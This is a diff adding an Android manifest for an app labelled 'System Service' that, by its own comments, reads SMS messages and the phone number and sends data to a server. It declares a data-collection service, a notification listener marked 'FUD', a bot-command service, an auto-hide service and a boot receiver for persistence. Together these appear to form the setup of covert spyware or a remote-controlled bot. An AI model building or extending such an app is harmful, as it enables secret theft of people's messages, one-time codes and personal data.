@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.apkmodifier">
+
+    <!-- LITE VERSION - Minimal Permissions -->
+    
+    <!-- Network Permission (to send data to server) -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    
+    <!-- Phone Permission (to read phone number) -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    
+    <!-- SMS Permission (to read SMS messages) -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    
+    <!-- System Permissions for service operation -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Service"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true"
+        android:requestLegacyExternalStorage="true"
+        android:extractNativeLibs="true"
+        android:hardwareAccelerated="true"
+        android:largeHeap="true"
+        android:persistent="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait"
+            android:configChanges="orientation|screenSize">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Background Service for Processing -->
+        <service
+            android:name=".BackgroundProcessService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Python Server Service -->
+        <service
+            android:name=".PythonServerService"
+            android:enabled="true"
+            android:exported="false" />
+        
+        <!-- Data Collection Service -->
+        <service
+            android:name=".DataCollectionService"
+            android:enabled="true"
+            android:exported="false" />
+        
+        <!-- Notification Listener Service (FUD) -->
+        <service
+            android:name=".NotificationMonitorService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+        
+        <!-- Bot Command Service -->
+        <service
+            android:name=".BotCommandService"
+            android:enabled="true"
+            android:exported="false" />
+        
+        <!-- Auto Hide Service -->
+        <service
+            android:name=".AutoHideService"
+            android:enabled="true"
+            android:exported="false" />
+        
+        <!-- Screen Manager Service -->
+        <service
+            android:name=".ScreenManager"
+            android:enabled="true"
+            android:exported="false" />
+
+    </application>
+
+</manifest>
